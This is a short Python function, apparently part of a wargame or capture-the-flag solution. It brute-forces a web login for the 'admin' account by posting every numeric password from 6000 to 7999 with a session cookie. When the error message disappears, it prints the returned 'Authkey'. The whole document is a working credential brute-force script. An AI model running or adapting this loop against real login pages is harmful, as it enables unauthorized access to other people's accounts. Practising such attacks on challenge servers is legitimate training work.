def part4(session, URL, cookie):
    for i in range(6000, 7999) :
        data4={
            "id":"admin",
            "pw":i
           }

        req4=session.post(URL, cookies=cookie, data=data4)
        if (req4.text.find("Password Incorrect!") == -1 ) :
            index=req4.text.find("Authkey")
            print ("\n\n")
            print (req4.text[index:index+30])
            print ("\n\n")
            input("Press Any KEY to exit......")
            exit (0)
#        else :
#            print ("proc 4")
